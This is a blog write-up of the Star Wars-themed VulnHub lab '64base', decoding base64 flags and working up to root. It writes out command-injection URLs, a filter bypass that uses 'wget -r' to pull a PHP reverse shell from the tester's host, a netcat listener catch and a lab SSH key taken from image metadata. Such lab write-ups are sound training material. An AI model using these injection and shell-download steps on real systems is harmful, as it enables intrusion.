---
layout: post
title: "All your 64Base are belong to us"
date: 2018-10-26 15:14:14 -0400
comments: true
categories: [penetration testing, writeups]
keywords: 64base, pentest lab, vulnhub, ctf, boot2root, base64
description: 64base writeup
---

This machine is based on Star Wars. The goal is "to Beat the Empire and steal the plans for the Death Star before its too late.". For this to happen, 6 flags encoded in base64 need to be collected.

[I AM THE EMPIRE!](https://www.youtube.com/watch?v=v8MqvUeDqL4)

<!-- more -->

``` 
PORT      STATE SERVICE VERSION
22/tcp    open  ssh?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     The programs included with the Fedora GNU/Linux system are free software;
|     exact distribution terms for each program are described in the
|     individual files in /usr/share/doc/*/copyright.
|     Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
|     permitted by applicable law.
|_    Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 429 disallowed entries (15 shown)
| /administrator/ /admin/ /login/ /88888/ /88888888/ 
| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/ 
|_/across/ /activation/ /Adjustments/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: 64base
4899/tcp  open  radmin?
| fingerprint-strings: 
|   NULL: 
|     sshhh! ssh! droids!
|     So..
|     found a way in then...
|     but, can you pop root?
|     /~\n |oo ) Did you hear that?
|     _=/_
|     ()\x20 //|/.\|\
|     _|_____|_ \ _/ ||
|     \|\x20/| ||
|     ||__*__|| | | |
|     ___/ ~| []|[]
|     /=\x20/=\x20/=\x20 | | |
|_    ________________[_]_[_]_[_]________/_]_[__________________________
62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 (DSA)
|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 (RSA)
|   256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 (ECDSA)
|_  256 e0:45:24:da:a1:2d:8a:21:c8:cf:98:4b:7f:42:e7:d4 (ED25519)
```

The first red herring is SSH on port 22. If you try connecting to it, it looks like it gives you a root shell, and then it closes the connection. There is no SSH there:

``` 
nc -vn 192.168.145.138 22
(UNKNOWN) [192.168.145.138] 22 (ssh) open
The programs included with the Fedora GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001

#
id
```

Then there is port 4899, which shows some ASCII art, but nothing seems to happen otherwise:

``` 
You found a way in then...

but, can you pop root?



                                           /~\
                                          |oo )    Did you hear that?
                                          _\=/_
                          ___            /  _  \
                         / ()\          //|/.\|\\
                       _|_____|_        \\ \_/  ||
                      | | === | |        \|\ /| ||
                      |_|  O  |_|        # _ _/ #
                       ||  O  ||          | | |
                       ||__*__||          | | |
                      |~ \___/ ~|         []|[]
                      /=\ /=\ /=\         | | |
      ________________[_]_[_]_[_]________/_]_[_\_________________________
```



## Flag #1 - Decode and decode some more

The web server takes us to Lord Vader's blog:

{% img center /images/pentest/64base/blog.png 'blog' 'vader blog' %}

You probably noticed that weird string, *dmlldyBzb3VyY2UgO0QK*. If you look in the HTML source, you will find a comment following it:

``` 
<!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a-->
```

It's hex encoded, and decoding it gives a...I'm sure you expect it by now...base64 string:

``` 
ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==
```

Decoding this gives the 1st flag: <code>flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}</code>, and further decoding the flag leaves us with what look like credentials for something: <code>64base:Th353@r3N0TdaDr01DzU@reL00K1ing4</code>

## Flag #2 - Imperial class bounty hunter

If you browse the pages you can read some Star Wars centric posts. I didn't go through them thoroughly, but I did notice a relevant hint in a picture for something that might come up later:

{% img center /images/pentest/64base/hint.jpg 'hint' 'shell hint' %}

So..when we'll reach the point of getting a shell, we'll have to use *system* instead of *exec*. Cool..now it's time to look inside that massive robots.txt. There are too many entries to show and the few I've tried were blank. Under */admin* there's basic authentication, but the credentials from the first flag didn't work. Some attention to detail is required for this one. In the above picture, there is another important hint that I've overlooked: *Only respond if you are a real Imperial-Class BountyHunter*. Within the plethora of robots.txt entries there is this:

``` 
Disallow: /Imperial-class/
```

Useless like the others, but the message said *Imperial-Class*..could it be that one capital letter would make the difference? I tried http://192.168.145.138/Imperial-Class/ and another basic authentication box popped up, and this time the credentials worked!

{% img center /images/pentest/64base/error.jpg 'error' 'error' %}

It looks like a dead end, but the source is with us:

``` 
<!-- don't forget the BountyHunter login -->
```

Adding this part to the URL (*Imperial-Class/BountyHunter*) takes us to a login page:

{% img center /images/pentest/64base/login.jpg 'login' 'login' %}

The force..source to the rescue again! If you view the source, you will notice another 3 hex strings:

``` 
5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756
584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
```

Decoding them as a block gives us another base64 string:

``` 
ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=
```

And decoding this gives the second flag: <code>flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}</code>. But it's the inside that matters, and it's actually a [link to Youtube](https://www.youtube.com/watch?v=vJwytFWA8uA)

{% img center /images/pentest/64base/burp.png 'burp' 'burp' %}

So we'll have to use Burp for the next part.

## Flag #3 - Burp'ing for the empire

I've put some dummy values in the login form and intercepted the requests with Burp..it's important to also capture the server response, because the flag is in the 302 Moved Temporarily response from the server: <code>flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}</code>. And decoding it shows the way to the secret shell that was hinted at previously: <code>53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&c=id</code>

## Flag #4 - System, not exec

Going to http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&c=id takes us to a page that only has the text "[64base Command Shell]" displayed on it. Trying different commands for the *c* parameter doesn't change anything, but we have the tip from before. So I switched to **?f=system&c=id** and got the flag and the command output:

``` 
flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}

Debian GNU/Linux 8 \n \l

Sat Oct 27 16:05:00 BST 2018
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
          inet addr:192.168.145.138  Bcast:192.168.145.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe0a:a6d1/64 Scope:Link

uid=1001(64base) gid=1001(64base) groups=1001(64base)
```

Decoding the flag gives another set of possible credentials: <code>64base:64base5h377</code>. Tried them on the SSH with no success.

## Flag #5 - When nothing else works, recurse!

Even though it looks like we have a shell, in reality, many commands don't work. At this point, I looked at a hint from other solutions to understand what is going on. It seems there is some filtering in place, and you can see what is being filtered by using PHP's **var_dump** function, which displays structured information (type and value) about variables. I tried downloading a reverse shell from my system with <code>?f=system&c=wget http://192.168.145.133:8001/shell.php</code>, but of course it didn't work. However, when I tried looking at how the command is constructed with <code>?f=var_dump&c=wget http://192.168.145.133:8001/shell.php</code>, I saw what was filtered out:

``` 
string(190) "echo '
flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}
';cat.real /etc/issue;date;uname -a;/sbin/ifconfig eth0|/usr/share/grep.real inet;echo
 sudo -u 64base wget http192.168.145.1338001shell.php"
```

The slash and colon characters are filtered out. I played with it and saw that other special characters are also filtered out, so I couldn't use command chaining to get rid of it. I could not point wget to my server that with the shell. But wget has the option of recursive downloading, with the *-r* switch. If I could serve the shell in the root of my web server, it should be recursively downloaded, since there would be no blacklisted characters in the command. So I used Python's SimpleHTTPServer to serve the shell on port 80 and tested the recursive download from my machine, and it created a directory corresponding with the one downloaded, with the shell inside:

``` 
wget -r 192.168.145.133
--2018-10-27 10:03:58--  http://192.168.145.133/
Connecting to 192.168.145.133:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 216 [text/html]
Saving to: ‘192.168.145.133/index.html’

192.168.145.133/index.html            100%[======================================================================>]     216  --.-KB/s    in 0s      

2018-10-27 10:03:58 (11.8 MB/s) - ‘192.168.145.133/index.html’ saved [216/216]

Loading robots.txt; please ignore errors.
--2018-10-27 10:03:58--  http://192.168.145.133/robots.txt
Connecting to 192.168.145.133:80... connected.
HTTP request sent, awaiting response... 404 File not found
2018-10-27 10:03:58 ERROR 404: File not found.

--2018-10-27 10:03:58--  http://192.168.145.133/shell.php
Connecting to 192.168.145.133:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5497 (5.4K) [application/octet-stream]
Saving to: ‘192.168.145.133/shell.php’

192.168.145.133/shell.php             100%[======================================================================>]   5.37K  --.-KB/s    in 0s      

2018-10-27 10:03:58 (638 MB/s) - ‘192.168.145.133/shell.php’ saved [5497/5497]

FINISHED --2018-10-27 10:03:58--
Total wall clock time: 0.01s
Downloaded: 2 files, 5.6K in 0s (212 MB/s)
```

I made the change and dumped the variable as it looks now:

``` 
sudo -u 64base wget -r 192.168.145.138
```

Things are looking good. But when I ran it, still nothing happened, and there was no GET request downloading the shell on my Python server. After more time spent dumping variations of the command, the one that finally worked was <code>?f=system&c=ls | wget -r 192.168.145.133</code>

Now my server received a request, and when I listed the current directory:

``` 
total 48K
drwxr-xr-x 6 www-data www-data 4.0K Oct 27 18:12 .
drwxr-xr-x 3 www-data www-data 4.0K Dec  6  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Oct 27 18:12 192.168.145.133
-rwxr-x--- 1 www-data www-data 2.1K Dec  5  2016 cat
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 css
-rwxr-x--- 1 www-data www-data  757 Dec  6  2016 index.html
-rwxr-x--- 1 www-data www-data  705 Dec  5  2016 index.jade
-rwxr-x--- 1 www-data www-data  959 Dec  6  2016 index.php
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 js
-rwxr-x--- 1 www-data www-data 1.1K Dec  5  2016 license.txt
-rwxr-x--- 1 www-data www-data  835 Dec  6  2016 login.php
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 scss
```

Navigating to http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php served me the shell on my listener:

``` 
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.145.133] from (UNKNOWN) [192.168.145.138] 45307
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
 18:44:14 up  4:27,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'      
www-data@64base:/$ 
```

I looked around and saw more ASCII art files, then I ran a quick search for the flag:

``` 
www-data@64base:/$ find / -name flag* 2>/dev/null
/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==}
```

And the hint for the last flag is <code>Look Inside! :D</code>.

## Flag #6 - Use the force

Running file on the found file shows that it's a JPEG image:

``` 
JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "4c5330744c5331435255644a546942535530456755464a4a566b4655525342", baseline, precision 8, 960x720, frames 3
```

There is hex in the comment, I decoded it to <code>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSB</code>. Then I passed this through a base64 decoder and it gave me the beginning of an SSH private key:

``` 
-----BEGIN RSA PRIVATE
```

I needed to take a better look at this, so I downloaded it to my machine:

{% img center /images/pentest/64base/flag.jpg 'flag' 'flag5' %}

And then I ran exiftool on it and the comment string was actually huge. So there must be a complete private key in there. So I went again through the hex and bas64 decoding process, to get the key:

``` 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C

mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
-----END RSA PRIVATE KEY-----
```

When trying to SSH with the key, I got prompted for a passphrase. I took a swing at it with the message from the image, *usetheforce*, and it was a win:

``` 
ssh root@192.168.145.138 -p 62964 -i ssh.key
Enter passphrase for key 'ssh.key': 

Last login: Tue Dec  6 05:40:07 2016 from 172.16.0.18

flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}
root@64base:~# 
```

Almost over, because that flag required several decoding cycles before it gave me something usable: <code>base64 -d /var/local/.luke|less.real</code>. With that, I ran it and got the mission success message, which will take a couple of minutes to read:

``` 
         __          __  _ _   _____                      
         \ \        / / | | | |  __ \                     
          \ \  /\  / /__| | | | |  | | ___  _ __   ___    
           \ \/  \/ / _ \ | | | |  | |/ _ \| '_ \ / _ \   
            \  /\  /  __/ | | | |__| | (_) | | | |  __/   
         __  \/ _\/ \___|_|_|_|_____/ \___/|_|_|_|\___| _ 
         \ \   / /          |  __ \(_)   | | |_   _| | | |
          \ \_/ /__  _   _  | |  | |_  __| |   | | | |_| |
           \   / _ \| | | | | |  | | |/ _` |   | | | __| |
            | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|
            |_|\___/ \__,_| |_____/|_|\__,_| |_____|\__(_)
    
_____ _ _ _ __ __ __  _ ___ _   __  ___  __ __  __  _  ___ _ _  __ _________
%=x%= | |V| |_)|_ |_) | |_| |   |_) |_| (_  |_  |_) |  |_| |\| (_  %=x%=x%=x
~~~~~ | | | |  |_ | \ | | | |_  |_) | | __) |_  |   |_ | | | | __) ~~~~~~~~~
LS
                 .-. .-.
               .=========.         E x t e r i o r ,   A e r i a l   V i e w
               ||.-.7.-.||         -----------------------------------------
               ||`-' `-'||
               `========='
                `-'| |`-'8               1 .............. Sensor Suite Tower
          ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets
         /     /\__| |__/\     \         3 ............. Heavy Laser Turrets
        /  \_ / /  |_|  \ \ _/  \        4 ....... TIE Fighter Launch Chutes
       /___(\\\/         \///)___\       5 ............... Heavy Blast Doors
       \____\\`==========='//____/       6 .................... Guard towers
       /     '/ .-------. \\     \       7 ........ Shuttle Landing Platform
    __/     //. \`+---+'/ .\\     \__    8 ........... AT-AT Docking Station
   /\ \    ///x`.\|___|/.'x\\\    / /\   9 ................. Connecting Ramp
  /  \ \  //`-._//|   |\\_.2'\\  / /  \
 /  _.-==='_____//.-=-.\\_____`===-._  \
 \   `-===.\-.  \ `-=1' /  .-/.===-' 3 / The pre-fabricated,  multi-function
  \  / /  \\\ \  \.===./  /4///  \ \  /  Imperial garrison base is the back-
   \/_/    \\\ | /.---.\ | ///    \_\/   bone of the  Empire's  occupational
      \     \\\|/ |_m_| \|///     /      forces. These heavily-armoured for-
       \_____\=============/_____/       tresses have  walls up to 10 meters
       /____///    ___    \\\____\       thick  to  guard   against   ground
       \   (_//\__|||||__/\\_)   /       assaults,  and  powerful  deflector
        \  /  \|,,|||||,,|/  \  /        shields  protect  them  for  air or
         \_____|  | 5 | 6|_____/         space attacks.
               `--'   `--'
____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                           U           E x t e r i o r ,   S i d e   V i e w
                          /_\          -------------------------------------
                       1 [___]
                         :`:':           1 .............. Sensor Suite Tower
                         `:::'           2 ... Heavy Twin Turbolaser Turrets
                  _       :_:       _    3 ............. Heavy Laser Turrets
                =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes
                 :=:      :=:      :=:   5 ............... Heavy Blast Doors
                _|_|_   __| |__   _|_|_  6 .................... Guard Towers
               / /XX|\ /__|_|__\ /|XX\ \
         3    /4/XXX| | _/___\_ | |XXX\ \             7 ....... AT-AT Walker
    --===____/--===X|_|/_______\|_|X===--\____===--   8 ........ AT-ST Scout
     /__| |     /l_\\             //_|\     |_|__\
    /~~.' |    /:'  \\   _____   //  `:\    | `.  \
   /   | .'   / |    \\==|||||==//    | \   `. |   \   7    8
  /   .' |   / .'     |  ||5|| 6|     `. \   | `.   \  xx=   _
 /____|__|__/__|______l__|||||__l______|__\__|__|____\ ll   <~

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                                 O u t e r   D e f e n s e s
            |                      |             ---------------------------
         ^_[]_^                 ^_[]_^
         |----|               5 |----|        1 ... High Voltage Death Fence
 ________`-..-'________4________`-..-'______  2 ....... Perimeter Gate House
 ===========================================  3 ........ Powered Force Field
          `||'                   `||'         4 .......... Fortified Catwalk
           ||     ^==^   ^==^     ||          5 ......... Observattion tower
 ___.____._ll_._1_|--|   |--|___._ll_.____.____
 XXX|XXXX|XIIX|XXX|--| 3 |--|XXX|XIIX|XXXX|XXXX
 XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX

 The outer perimeter is  marked  by a  high-voltage  "death fence."  Powered
 Force fields  placed at regular intervals along the fence may be turned off
 to permit entry and exit.  Observation towers,  connected by fortified cat-
 walks,  are set back from the fence and constantly manned by stormtroopers.
 Other outer  defenses  include energy mine fields,  modified patrol Droids,
 and AT-ST Scout Walkers.

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             _
            /|                               L a n d i n g   P l a t f o r m
          -==+                               -------------------------------
            :
         [__________]               Up to two Lambda-class shuttles and four
         `' ||  ||`-'               AT-AT  Walkers can dock at the platform.
           ========  =xx            A loading  ramp  leads directly from the
            ||  ||    ll            platform into the garrison complex.
     ~~~~~~~~~~~~~~~~~~~~~~
____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                     I n t e r i o r ,   L e v e l s   1 - 5
                                     ---------------------------------------

          ______         ______      The first 5 levels of the garrison com-
         / ____ \_______/ ____ \     plex are of identical layout, construc-
        / /    \_________/    \ \    ted  around  a  level-spanning  surface
       / /      |   3   |  5   \ \   vehicle bay.  Refer to the key below to
       \ \       \_____/_______/ /   determine what each level contains.
       / /    o   |o o|   o    \ \
    __/ /  2    .' o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),
   / __/      .' ._o_o_. `.      \__ \         Armory (levels 3-4), Training
  / /  `-.  .' .'  10   `. `.  .-'  \ \        Facilities   and   Recreation
 / /      ~' .'`-._____.-'`. `~      \ \       Rooms (level 5)
 \ \     o  <  C  | | |  D  >  o  7  / / 2 ... Stormtrooper Barracks (levels
  \ \__      \    ' ' '    /      __/ /        1-3),    Security    Barracks
   \__ \  1  |----  9  ----|~-._ / __/         (levels 4-5)
      \ \    |====    B====|    Y /      3 ...... Base Security (levels 1-5)
       \ \   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)
       / /   |__A_     _ __| 8 \ \       5 .... Detention Block (levels 1-5)
       \ \      | |   | |      / /       6 ... Technical and Service Person-
        \ \_____| |   | |_____/ /              nel Barracks (levels 1-5)
         \_____ `o|   |o' _____/         7 ... Technical Shops (levels 1-2),
               `--'   `--'                     Medical   Bay    (level   3),
                                               Science Labs (levels 4-5)
                8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)
                9 ...................... Surface Vehicle  Bay  (levels 1-5):
                A .................................. AT-ST Scout Walker Bays
                B ........................................ AT-AT Walker Bays
                C ...................... Vehicle Maintenance and Repair Deck
                D ........................................ Speeder Bike Deck
                10 ........................... Miscellaneous Vehicle Parking

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                           I n t e r i o r ,   L e v e l   6
                                           ---------------------------------
         ____           ____
        / __ \_________/ __ \        Base command personnel,  control rooms,
       / /  \___________/  \ \       rooms,  trade  mission,  and diplomatic
       \ \ o     oo      o / /       offices are located on this level.
       / /       oo----.   \ \
      / /   8  __oo     `.1 \ \      1 ....... Sensor Monitors, Tractor Beam
   __/ /\    .~  ||   2   \  \ \__                       and Shield Controls
  / __/  \ .' 9.-'`-.      | /\__ \  2 ....................... Computer Room
 / /   o  \|__:   o  :_____|/ o  \ \ 3 ....................... Meeting Rooms
 \ \__  7 .---: 10   :------.3 __/ / 4 ...... Officers' and Pilots' Quarters
  \__ \  /     `-..-'        \/ __/  5 ... Trade Mission, Diplomatic Offices
     \ \/\   5   ||          / /     6 ........... Base Commander's Quarters
      \ \ `.     ||    4    / /                                  and offices
       \ \ o~`---||      o / /       7 ............ Officer Recreation Rooms
       / /6  ____||_____   \ \       8 ............................. Offices
       \ \__/ _________ \__/ /       9 ................... Base Control Room
        \____/         \____/        10 ..................... Reception Area


____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                           I n t e r i o r ,   L e v e l   7
                                           ---------------------------------
        __             __
       /_]\           /[_\        The TIE Fighter  Hanger  Deck  houses  the
       \ \,===========./ /        garrison's TIE fighters in standard-design
       //:o-----------o:\\        ceiling racks.  Bases are usually equipped
      /// X  X X X X  X \\\       with  30 TIE fighters and five TIE bombers
     /// X X  X_X_X  X X \\\      (a single  bomber  takes  up the same rack
  __/// X X   [___]   X X \\\__   space as two fighters).  Five  to 15 ships
 /\_/o X X  1 &/3\&    X X o\_/\  are on constant  patrol,  depending on the
 \]_\\ X X   <\\_//>       //_[/  base's readiness level.
    \\\ X X   \>&</2  X []///
     \\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks
      \\\ X   [] []     ///                           (holds up to 40 craft)
       \\:o-----------o://        2 ............. Lift Platforms, to Level 8
       /_/`==========='\_\        3 .................. Flight Control Center
       \_]/           \[_/        X ............................ TIE Fighter
                                  [] ............................ TIE Bomber

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                           I n t e r i o r ,   L e v e l   8
                                           ---------------------------------
                                                      (not shown)

  The Flight Deck contains the  tractor beam  generators which catapult out-
  going craft into the open sky and reel in landing ships. Pilots relinquish
  control of  their ships during take off and landing because of the limited
  maneuvering area within the chutes.

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                               S u b - L e v e l   I n s t a l l a t i o n s
                               ---------------------------------------------
                                                (not shown)

  A large underground section of the base  houses the main power and back-up
  generators, the tractor beam and deflector shield generators, the environ-
  ment  control  station,  and  the  waste  disposal and refuse units.  Some
  storage facilities are also located here.

____________________________________________________________________________
%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Version 1.9 (released 941211).
 Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob
 VanderClay and Joe Rumsey.  The pictures work best when shown on a white on
 black screen  (except for some faces)  with a not too fancy font. Contribu-
 tions welcome, email to the adress below. Sources LS: The Star Wars Source-
 book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source-
 book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.

____________________________________________________________________________

  ______  ______  ______  ______  ______  ______  ______  ______  
 |______||______||______||______||______||______||______||______||______| 
  _   _   ____ __          __ __     __ ____   _    _  _  _____   ______  
 | \ | | / __ \\ \        / / \ \   / // __ \ | |  | |( )|  __ \ |  ____| 
